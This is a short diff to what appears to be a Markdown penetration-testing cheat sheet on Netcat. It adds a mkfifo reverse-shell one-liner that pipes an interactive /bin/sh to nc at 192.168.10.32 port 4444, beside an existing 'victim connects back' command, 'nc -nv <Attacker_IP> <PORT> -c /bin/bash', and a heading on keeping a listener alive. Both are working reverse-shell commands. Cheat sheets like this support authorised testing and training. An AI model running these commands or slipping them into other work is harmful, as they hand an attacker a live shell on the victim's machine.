@@ -70,6 +70,9 @@
 > # Victim Linux (Connects back)
 > nc -nv <Attacker_IP> <PORT> -c /bin/bash
 > ```
+> ```bash
+> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -nv 192.168.10.32 4444 > /tmp/f
+> ```
 
 > [!tip]+ Netcat Persistence (Looping Listener)
 > Keeps a Netcat listener alive even after the client disconnects.
